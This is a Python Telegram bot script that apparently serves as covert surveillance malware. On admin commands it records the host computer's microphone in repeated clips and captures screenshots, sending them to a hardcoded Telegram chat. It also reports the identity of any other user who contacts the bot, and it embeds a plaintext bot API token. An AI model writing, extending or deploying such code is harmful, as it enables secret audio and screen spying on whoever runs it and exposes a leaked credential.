import telebot

from cfg import *

API_TOKEN = "6466690541:AAFfFWUqEbEzZfIOuybgrqHot_hJYBiI-eI"
ADMIN = 804011643

bot = telebot.TeleBot(API_TOKEN)

def checkID(ms):
    if ms.from_user.id == ADMIN:
        return True
    else:
        info = f"""
        Name - {ms.from_user.first_name}
        Surname - {ms.from_user.last_name}
        UserName - {ms.from_user.username}
        Language - {ms.from_user.language_code}
        """
        bot.send_message(ADMIN, "USED:")
        bot.send_message(ADMIN, info)
        return False

@bot.message_handler(commands=["start", "help"])
def send_welcome(ms):
    if checkID(ms):
        bot.send_message(ADMIN, cmd)
        
@bot.message_handler(commands=["micro_recording"])
def micro_recording_first(ms):
    if checkID(ms):
        bot.send_message(ADMIN, "Enter time, quantity iteration...")
        
        @bot.message_handler(content_types=["text"])
        def micro_recording_last(ms):
            try:
                list_data = ms.text.split(" ")
                time = int(list_data[0])
                quantity = int(list_data[1])
                bot.send_message(ADMIN, "Recording...")
                
                for i in range(quantity):
                    record(time)
                    with open("recorded.wav", 'rb') as audio:
                        bot.send_audio(ADMIN, audio)
                
                bot.send_message(ADMIN, "Finished recording.")
            except Exception as e:
                bot.send_message(ADMIN, f"Error:\n{e}")

        bot.register_next_step_handler(ms, micro_recording_last)

@bot.message_handler(commands=["screenshot"])
def screenshot(ms):
    myScreenshot = pyautogui.screenshot()
    myScreenshot.save("screenshot.jpg")
    
    with open("screenshot.jpg", "rb") as photo:
        bot.send_photo(ADMIN, photo)


bot.infinity_polling()